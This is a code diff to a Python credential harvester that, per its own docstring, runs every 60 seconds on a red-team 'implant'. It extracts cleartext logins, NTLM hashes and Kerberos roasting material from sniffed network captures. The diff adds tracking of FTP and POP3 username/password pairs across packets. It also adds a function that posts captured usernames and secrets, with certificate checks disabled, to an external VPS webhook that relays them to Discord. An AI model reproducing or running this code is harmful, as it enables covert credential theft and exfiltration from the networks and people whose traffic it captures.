@@ -8,8 +8,8 @@ hashes, and tokens useful during red-team engagements.
 Runs every 60 s via systemd timer.  Only processes *new* data (tracks
 file sizes between runs).  Deduplicates findings across invocations.
 
-Findings are appended to a JSON file that the VPS-side OpenClaw skill
-reads via the implant Flask API.
+Findings are appended to a JSON file and pushed to the VPS-side OpenClaw
+webhook for real-time Discord alerts.
 """
 
 from __future__ import annotations
@@ -32,11 +32,12 @@ from datetime import datetime, timezone
 SNIFFER_LOG_DIR = os.environ.get(
     "SNIFFER_LOG_DIR", "/opt/implant/logs/packet-sniffer"
 )
-OPENCLAW_LOG_DIR = os.environ.get(
-    "OPENCLAW_LOG_DIR", "/opt/implant/logs/openclaw"
+CRED_ANALYZER_LOG_DIR = os.environ.get(
+    "CRED_ANALYZER_LOG_DIR", "/opt/implant/logs/cred-analyzer"
 )
-STATE_FILE = os.path.join(OPENCLAW_LOG_DIR, "cred-state.json")
-FINDINGS_FILE = os.path.join(OPENCLAW_LOG_DIR, "cred-findings.json")
+STATE_FILE = os.path.join(CRED_ANALYZER_LOG_DIR, "state.json")
+FINDINGS_FILE = os.path.join(CRED_ANALYZER_LOG_DIR, "findings.json")
+LOG_FILE = os.path.join(CRED_ANALYZER_LOG_DIR, "cred-analyzer.log")
 
 
 # ---------------------------------------------------------------------------
@@ -60,14 +61,28 @@ def save_state(state: dict) -> None:
 def load_findings() -> list:
     if os.path.isfile(FINDINGS_FILE):
         with open(FINDINGS_FILE) as f:
-            return json.load(f)
+            data = json.load(f)
+        # Support both old (flat list) and new (wrapped) format
+        if isinstance(data, dict):
+            return data.get("findings", [])
+        return data
     return []
 
 
 def save_findings(findings: list) -> None:
+    from collections import Counter
+    by_type = dict(Counter(f["type"] for f in findings))
+    by_protocol = dict(Counter(f["protocol"] for f in findings))
+    doc = {
+        "last_updated": datetime.now(timezone.utc).isoformat(),
+        "total_count": len(findings),
+        "by_type": by_type,
+        "by_protocol": by_protocol,
+        "findings": findings,
+    }
     tmp = FINDINGS_FILE + ".tmp"
     with open(tmp, "w") as f:
-        json.dump(findings, f, indent=2)
+        json.dump(doc, f, indent=2)
     os.replace(tmp, FINDINGS_FILE)
 
 
@@ -254,23 +269,30 @@ def parse_http(payload: bytes, src: str, dst: str) -> list[dict]:
 
 # ---- FTP -----------------------------------------------------------------
 
-def parse_ftp(payload: bytes, src: str, dst: str) -> list[dict]:
+def parse_ftp(payload: bytes, src: str, dst: str, sessions: dict) -> list[dict]:
+    """FTP sends USER and PASS as separate TCP packets.
+    Track USER in ``sessions`` and emit a finding when PASS arrives."""
     findings = []
     text = _safe_decode(payload)
     lines = text.split("\r\n") if "\r\n" in text else text.split("\n")
 
-    user = passwd = ""
     for line in lines:
-        if line.upper().startswith("USER "):
+        upper = line.upper()
+        if upper.startswith("USER "):
             user = line[5:].strip()
-        elif line.upper().startswith("PASS "):
+            if user:
+                # Store username keyed by client->server connection
+                sessions[f"ftp|{src}|{dst}"] = user
+        elif upper.startswith("PASS "):
             passwd = line[5:].strip()
+            key = f"ftp|{src}|{dst}"
+            user = sessions.pop(key, "")
+            if user or passwd:
+                findings.append(_make_finding(
+                    "cleartext", "FTP", src, dst,
+                    username=user, secret=passwd,
+                ))
 
-    if user:
-        findings.append(_make_finding(
-            "cleartext", "FTP", src, dst,
-            username=user, secret=passwd,
-        ))
     return findings
 
 
@@ -327,23 +349,28 @@ def parse_smtp(payload: bytes, src: str, dst: str) -> list[dict]:
 
 # ---- POP3 ----------------------------------------------------------------
 
-def parse_pop3(payload: bytes, src: str, dst: str) -> list[dict]:
+def parse_pop3(payload: bytes, src: str, dst: str, sessions: dict) -> list[dict]:
+    """POP3 sends USER and PASS as separate TCP packets (same as FTP)."""
     findings = []
     text = _safe_decode(payload)
     lines = text.split("\r\n") if "\r\n" in text else text.split("\n")
 
-    user = passwd = ""
     for line in lines:
-        if line.upper().startswith("USER "):
+        upper = line.upper()
+        if upper.startswith("USER "):
             user = line[5:].strip()
-        elif line.upper().startswith("PASS "):
+            if user:
+                sessions[f"pop3|{src}|{dst}"] = user
+        elif upper.startswith("PASS "):
             passwd = line[5:].strip()
+            key = f"pop3|{src}|{dst}"
+            user = sessions.pop(key, "")
+            if user or passwd:
+                findings.append(_make_finding(
+                    "cleartext", "POP3", src, dst,
+                    username=user, secret=passwd,
+                ))
 
-    if user:
-        findings.append(_make_finding(
-            "cleartext", "POP3", src, dst,
-            username=user, secret=passwd,
-        ))
     return findings
 
 
@@ -386,7 +413,7 @@ def parse_telnet(payload: bytes, src: str, dst: str) -> list[dict]:
 def parse_ldap(payload: bytes, src: str, dst: str) -> list[dict]:
     findings = []
     # Simple LDAP bind: look for BER-encoded BindRequest
-    # Sequence → Application[0] → version, name (DN), Simple auth
+    # Sequence -> Application[0] -> version, name (DN), Simple auth
     # We use a heuristic: look for printable strings that resemble DN + password
     if len(payload) < 10:
         return findings
@@ -421,7 +448,7 @@ def parse_ldap(payload: bytes, src: str, dst: str) -> list[dict]:
 
 def parse_snmp(payload: bytes, src: str, dst: str) -> list[dict]:
     findings = []
-    # SNMP v1/v2c: Sequence → version (int) → community (octet string)
+    # SNMP v1/v2c: Sequence -> version (int) -> community (octet string)
     if len(payload) < 10 or payload[0] != 0x30:
         return findings
     try:
@@ -506,7 +533,7 @@ def parse_ntlm(payload: bytes, src: str, dst: str, challenges: dict) -> list[dic
     """
     Extract NTLM challenge-response hashes from NTLMSSP messages.
     ``challenges`` is a mutable dict mapping (src_ip, dst_ip) to the
-    server challenge bytes — shared across packets in one PCAP pass.
+    server challenge bytes --- shared across packets in one PCAP pass.
     """
     findings = []
     idx = payload.find(_NTLMSSP_SIG)
@@ -520,14 +547,14 @@ def parse_ntlm(payload: bytes, src: str, dst: str, challenges: dict) -> list[dic
     msg_type = struct.unpack_from("<I", ntlm, 8)[0]
 
     if msg_type == 2:
-        # Type 2 — Challenge message: store the server challenge
+        # Type 2 -- Challenge message: store the server challenge
         if len(ntlm) >= 32:
             challenge = ntlm[24:32]
             # Key by the connection endpoints (server sends challenge)
             challenges[(dst, src)] = challenge.hex()
 
     elif msg_type == 3:
-        # Type 3 — Authenticate message: extract hash
+        # Type 3 -- Authenticate message: extract hash
         if len(ntlm) < 72:
             return findings
         try:
@@ -588,7 +615,7 @@ def parse_kerberos(payload: bytes, src: str, dst: str) -> list[dict]:
     # Kerberos uses ASN.1 DER.  We look for application tags:
     # AS-REP  = 0x6B (application 11)
     # TGS-REP = 0x6D (application 13)
-    # AS-REQ  = 0x6A (application 10) — extract principal for roasting candidates
+    # AS-REQ  = 0x6A (application 10) -- extract principal for roasting candidates
 
     for tag, label in [(0x6B, "AS-REP"), (0x6D, "TGS-REP"), (0x6A, "AS-REQ")]:
         idx = -1
@@ -600,7 +627,7 @@ def parse_kerberos(payload: bytes, src: str, dst: str) -> list[dict]:
         rest = payload[idx:]
 
         if tag == 0x6A:
-            # AS-REQ — extract client principal name as roasting candidate
+            # AS-REQ -- extract client principal name as roasting candidate
             # Look for principal name strings in the ASN.1
             strings = re.findall(rb"[\x1b][\x03-\x40]([\x20-\x7e]{2,64})", rest)
             if strings:
@@ -608,11 +635,11 @@ def parse_kerberos(payload: bytes, src: str, dst: str) -> list[dict]:
                 findings.append(_make_finding(
                     "kerberos", "AS-REQ (roasting candidate)", src, dst,
                     username=principal,
-                    details="Pre-auth request — may be AS-REP roastable if pre-auth disabled",
+                    details="Pre-auth request -- may be AS-REP roastable if pre-auth disabled",
                 ))
 
         elif tag in (0x6B, 0x6D):
-            # AS-REP or TGS-REP — extract encrypted part
+            # AS-REP or TGS-REP -- extract encrypted part
             # Look for etype (encryption type) in the enc-part
             # etype 23 (RC4) = crackable
             # etype 17/18 (AES) = also crackable but slower
@@ -622,9 +649,9 @@ def parse_kerberos(payload: bytes, src: str, dst: str) -> list[dict]:
             realm = _safe_decode(strings[0]) if len(strings) > 0 else "UNKNOWN"
             principal = _safe_decode(strings[1]) if len(strings) > 1 else "unknown"
 
-            # Check for etype 23 (0x17) — RC4, most common crackable type
+            # Check for etype 23 (0x17) -- RC4, most common crackable type
             if b"\xa0\x03\x02\x01\x17" in rest:
-                # etype 23 — extract cipher
+                # etype 23 -- extract cipher
                 cipher_start = rest.find(b"\xa2")
                 if cipher_start != -1:
                     cipher_hex = rest[cipher_start:cipher_start + 200].hex()
@@ -648,7 +675,7 @@ def parse_kerberos(payload: bytes, src: str, dst: str) -> list[dict]:
 # Main packet processor
 # ---------------------------------------------------------------------------
 
-# Port → parser mapping for TCP
+# Port -> parser mapping for TCP
 _TCP_PARSERS = {
     21: parse_ftp,
     23: parse_telnet,
@@ -662,12 +689,15 @@ _TCP_PARSERS = {
     5432: parse_databases,
     6379: parse_databases,
     8080: parse_http,
-    8443: None,  # Skip — this is the implant's own API
+    8443: None,  # Skip -- this is the implant's own API
     8888: parse_http,
 }
 
 # Ports that should be parsed as HTTP regardless (web servers on odd ports)
 _HTTP_INDICATORS = (b"HTTP/", b"GET ", b"POST ", b"PUT ", b"DELETE ", b"HEAD ")
+
+# Ports whose parsers need session tracking across packets (USER/PASS split)
+_STATEFUL_PORTS = {21, 110}
 
 
 def process_pcap(filepath: str, state: dict, seen: set) -> list[dict]:
@@ -682,6 +712,7 @@ def process_pcap(filepath: str, state: dict, seen: set) -> list[dict]:
 
     findings = []
     ntlm_challenges = {}  # Track NTLM challenges for response correlation
+    sessions = {}         # Track multi-packet credential exchanges (FTP, POP3)
 
     try:
         reader = PcapReader(filepath)
@@ -710,12 +741,18 @@ def process_pcap(filepath: str, state: dict, seen: set) -> list[dict]:
                 # Check destination port for known protocol
                 parser = _TCP_PARSERS.get(dport)
                 if parser:
-                    pkt_findings.extend(parser(raw, src, dst))
+                    if dport in _STATEFUL_PORTS:
+                        pkt_findings.extend(parser(raw, src, dst, sessions))
+                    else:
+                        pkt_findings.extend(parser(raw, src, dst))
 
                 # Check source port (server responses)
                 parser = _TCP_PARSERS.get(sport)
                 if parser:
-                    pkt_findings.extend(parser(raw, src, dst))
+                    if sport in _STATEFUL_PORTS:
+                        pkt_findings.extend(parser(raw, src, dst, sessions))
+                    else:
+                        pkt_findings.extend(parser(raw, src, dst))
 
                 # HTTP on non-standard ports
                 if not pkt_findings and any(raw.startswith(ind) for ind in _HTTP_INDICATORS):
@@ -780,7 +817,81 @@ def process_pcap(filepath: str, state: dict, seen: set) -> list[dict]:
     finally:
         reader.close()
 
+    # Flush incomplete sessions (USER captured without corresponding PASS)
+    for key, user in sessions.items():
+        parts = key.split("|", 2)
+        if len(parts) == 3:
+            proto, s, d = parts
+            f = _make_finding(
+                "cleartext", proto.upper(), s, d,
+                username=user, secret="",
+                details="Username captured; password not seen in traffic",
+            )
+            h = finding_hash(f)
+            if h not in seen:
+                f["hash"] = h
+                findings.append(f)
+                seen.add(h)
+
     return findings
+
+
+# ---------------------------------------------------------------------------
+# OpenClaw webhook notification
+# ---------------------------------------------------------------------------
+
+def notify_openclaw(findings: list[dict]) -> None:
+    """Push new credential findings to the VPS OpenClaw webhook."""
+    # Kill-switch for credential notifications
+    if os.environ.get("OPENCLAW_NOTIFY_CREDS", "yes").lower() != "yes":
+        return
+
+    url = os.environ.get("OPENCLAW_WEBHOOK_URL", "")
+    token = os.environ.get("OPENCLAW_WEBHOOK_TOKEN", "")
+    channel = os.environ.get("OPENCLAW_ALERT_CHANNEL_ID", "")
+    implant_ip = os.environ.get("IMPLANT_WG_IP", "unknown")
+
+    if not url or not token:
+        return
+
+    try:
+        import requests as _req
+    except ImportError:
+        return
+
+    # Plain data -- formatting is handled by the cred-sniffer skill on VPS
+    entries = []
+    for f in findings:
+        parts = [f"protocol={f['protocol']}", f"type={f['type']}"]
+        if f.get("username"):
+            parts.append(f"user={f['username']}")
+        if f.get("secret"):
+            parts.append(f"secret={f['secret'][:120]}")
+        parts.append(f"src={f['src']}")
+        parts.append(f"dst={f['dst']}")
+        if f.get("details"):
+            parts.append(f"details={f['details']}")
+        entries.append(" | ".join(parts))
+
+    message = f"cred-alert: implant={implant_ip} count={len(findings)}\n" + "\n".join(entries)
+
+    payload = {
+        "message": message,
+        "name": "cred-analyzer",
+        "sessionKey": "hook:cred-alert",
+        "deliver": True,
+        "channel": "discord",
+        "to": channel,
+    }
+
+    try:
+        _req.post(
+            url, json=payload,
+            headers={"Authorization": f"Bearer {token}"},
+            timeout=15, verify=False,
+        )
+    except Exception:
+        pass
 
 
 # ---------------------------------------------------------------------------
@@ -788,7 +899,17 @@ def process_pcap(filepath: str, state: dict, seen: set) -> list[dict]:
 # ---------------------------------------------------------------------------
 
 def main() -> None:
-    os.makedirs(OPENCLAW_LOG_DIR, exist_ok=True)
+    os.makedirs(CRED_ANALYZER_LOG_DIR, exist_ok=True)
+
+    # Set up file logging for debugging
+    import logging
+    logging.basicConfig(
+        filename=LOG_FILE,
+        level=logging.INFO,
+        format="%(asctime)s - %(message)s",
+        datefmt="%Y-%m-%d %H:%M:%S",
+    )
+    logging.info("cred-analyzer started")
 
     # Check packet-sniffer is running
     if not is_sniffer_active():
@@ -814,6 +935,10 @@ def main() -> None:
     if new_findings:
         existing_findings.extend(new_findings)
         save_findings(existing_findings)
+        # Push new findings to VPS via OpenClaw webhook
+        notify_openclaw(new_findings)
+        import logging
+        logging.info(f"Found {len(new_findings)} new credentials, total: {len(existing_findings)}")
 
     # Update seen set in state
     state["seen"] = list(seen)
@@ -824,5 +949,7 @@ if __name__ == "__main__":
     try:
         main()
     except Exception as e:
-        # Never crash — we run on a timer
+        # Never crash -- we run on a timer
+        import logging
+        logging.exception(f"cred-analyzer fatal: {e}")
         sys.stderr.write(f"cred-analyzer error: {e}\n")
